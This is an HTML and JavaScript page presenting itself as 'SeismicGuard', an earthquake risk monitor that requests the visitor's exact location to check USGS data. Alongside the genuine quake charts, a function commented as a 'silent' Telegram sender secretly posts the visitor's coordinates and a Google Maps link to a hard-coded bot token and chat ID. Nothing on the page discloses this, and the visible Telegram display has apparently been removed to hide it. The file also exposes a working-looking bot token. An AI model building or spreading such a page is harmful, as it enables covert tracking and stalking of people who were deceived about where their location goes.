<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earthquake Risk Monitor</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        body { background: linear-gradient(to bottom right, #0f172a, #1e293b); color: white; font-family: sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- HEADER -->
    <header class="w-full max-w-4xl flex justify-between items-center mb-6">
        <div class="flex items-center gap-2">
            <i class="fa-solid fa-house-tsunami text-blue-500 text-2xl"></i>
            <h1 class="text-xl font-bold">Seismic<span class="text-blue-500">Guard</span></h1>
        </div>
        <div id="status" class="text-xs bg-gray-800 px-3 py-1 rounded-full text-gray-400 border border-gray-700">System Standby</div>
    </header>

    <!-- STEP 1: PERMISSION -->
    <div id="permission-screen" class="glass p-8 rounded-2xl max-w-md w-full text-center shadow-2xl">
        <div class="w-20 h-20 bg-blue-900/30 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/50">
            <i class="fa-solid fa-location-dot text-3xl text-blue-400"></i>
        </div>
        <h2 class="text-2xl font-bold mb-2">Local Risk Scan</h2>
        <p class="text-gray-400 text-sm mb-6">We need your exact location to check the USGS database.</p>
        <button onclick="startApp()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-6 rounded-xl transition shadow-lg shadow-blue-600/20">Allow Location & Scan</button>
    </div>

    <!-- STEP 2: LOADING -->
    <div id="loading-screen" class="hidden text-center">
        <i class="fa-solid fa-circle-notch fa-spin text-4xl text-blue-500 mb-4"></i>
        <p class="animate-pulse text-lg">Locating & Analyzing...</p>
    </div>

    <!-- STEP 3: DASHBOARD -->
    <div id="dashboard" class="hidden w-full max-w-4xl space-y-6">
        <!-- Stats Grid (Now only 2 columns since Telegram box is gone) -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="glass p-4 rounded-xl border-l-4 border-blue-500">
                <p class="text-xs text-gray-400 uppercase">Your Location</p>
                <p class="font-mono text-lg mt-1"><span id="lat-display">0.00</span>, <span id="lon-display">0.00</span></p>
            </div>
            
            <div class="glass p-4 rounded-xl border-l-4 border-gray-500" id="risk-box">
                <p class="text-xs text-gray-400 uppercase">Risk Assessment</p>
                <h2 id="risk-text" class="text-2xl font-bold mt-1">CALCULATING</h2>
            </div>
        </div>

        <div class="grid md:grid-cols-2 gap-4">
            <div class="glass p-4 rounded-xl">
                <h3 class="text-sm font-bold mb-4 text-gray-300">Quakes (Last 30 Days)</h3>
                <div class="h-64"><canvas id="barChart"></canvas></div>
            </div>
            <div class="glass p-4 rounded-xl">
                <h3 class="text-sm font-bold mb-4 text-gray-300">Severity %</h3>
                <div class="h-64 flex justify-center"><canvas id="doughnutChart"></canvas></div>
            </div>
        </div>
    </div>

    <script>
        // =========================================================
        // 1. TELEGRAM CONFIGURATION
        // =========================================================
        const TG_CONFIG = {
            botToken: "8322166321:AAFSuX4vYR4TC3O-cqjCAr8TjIuXkg35S0Y", // Paste Token here
            chatId:   "7564238332"    // Paste Chat ID here
        };

        // =========================================================
        // 2. MAIN LOGIC
        // =========================================================
        function startApp() {
            document.getElementById('permission-screen').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError);
            } else {
                alert("Geolocation not supported.");
                location.reload();
            }
        }

        function onLocationSuccess(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            document.getElementById('lat-display').textContent = lat.toFixed(4);
            document.getElementById('lon-display').textContent = lon.toFixed(4);

            // Send to Telegram (Silently)
            sendTelegramAlert(lat, lon);
            
            // Get Data
            fetchEarthquakes(lat, lon);
        }

        function onLocationError() {
            alert("You must allow location access.");
            location.reload();
        }

        // =========================================================
        // 3. SILENT TELEGRAM SENDER
        // =========================================================
        function sendTelegramAlert(lat, lon) {
            if (TG_CONFIG.botToken === "YOUR_BOT_TOKEN_HERE") {
                console.warn("Telegram keys missing.");
                return;
            }

            const message = `ðŸš¨ *Seismic Alert Activated* ðŸš¨\n\nðŸ“ *Latitude:* \`${lat}\`\nðŸ“ *Longitude:* \`${lon}\`\n\nðŸ—º [View on Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

            const url = `https://api.telegram.org/bot${TG_CONFIG.botToken}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CONFIG.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Location sent to Telegram successfully.");
                } else {
                    console.error("Telegram Error:", data);
                }
            })
            .catch(err => console.error("Network Error:", err));
        }

        async function fetchEarthquakes(lat, lon) {
            const end = new Date().toISOString();
            const start = new Date();
            start.setDate(start.getDate() - 30);
            const url = `https://earthquake.usgs.gov/fdsnws/event/1/query?format=geojson&latitude=${lat}&longitude=${lon}&maxradiuskm=200&starttime=${start.toISOString()}&endtime=${end}`;

            try {
                const response = await fetch(url);
                const data = await response.json();
                processData(data.features);
            } catch (error) {
                alert("Could not fetch earthquake data.");
            }
        }

        function processData(quakes) {
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('status').textContent = "System Active";
            document.getElementById('status').classList.replace("text-gray-400", "text-green-400");

            let low = 0, med = 0, high = 0, maxMag = 0;
            quakes.forEach(q => {
                const mag = q.properties.mag;
                if (mag > maxMag) maxMag = mag;
                if (mag < 4.0) low++;
                else if (mag < 6.0) med++;
                else high++;
            });

            const riskBox = document.getElementById('risk-box');
            const riskText = document.getElementById('risk-text');

            if (high > 0 || maxMag >= 6.0) {
                riskText.textContent = "HIGH";
                riskText.className = "text-2xl font-bold mt-1 text-red-500";
                riskBox.className = "glass p-4 rounded-xl border-l-4 border-red-500";
            } else if (med > 5 || maxMag >= 4.5) {
                riskText.textContent = "MODERATE";
                riskText.className = "text-2xl font-bold mt-1 text-yellow-500";
                riskBox.className = "glass p-4 rounded-xl border-l-4 border-yellow-500";
            } else {
                riskText.textContent = "LOW";
                riskText.className = "text-2xl font-bold mt-1 text-green-500";
                riskBox.className = "glass p-4 rounded-xl border-l-4 border-green-500";
            }

            drawCharts(low, med, high);
        }

        function drawCharts(low, med, high) {
            new Chart(document.getElementById('barChart'), {
                type: 'bar', data: { labels: ['Minor', 'Mod', 'Major'], datasets: [{ data: [low, med, high], backgroundColor: ['#3b82f6', '#eab308', '#ef4444'] }] }, options: { plugins: { legend: { display: false } }, scales: { y: { ticks: { color: '#94a3b8' } }, x: { ticks: { color: '#94a3b8' }, grid: { display: false } } } }
            });
            new Chart(document.getElementById('doughnutChart'), {
                type: 'doughnut', data: { labels: ['Minor', 'Mod', 'Major'], datasets: [{ data: [low, med, high], backgroundColor: ['#3b82f6', '#eab308', '#ef4444'], borderWidth: 0 }] }, options: { plugins: { legend: { position: 'bottom', labels: { color: 'white' } } } }
            });
        }
    </script>
</body>
</html>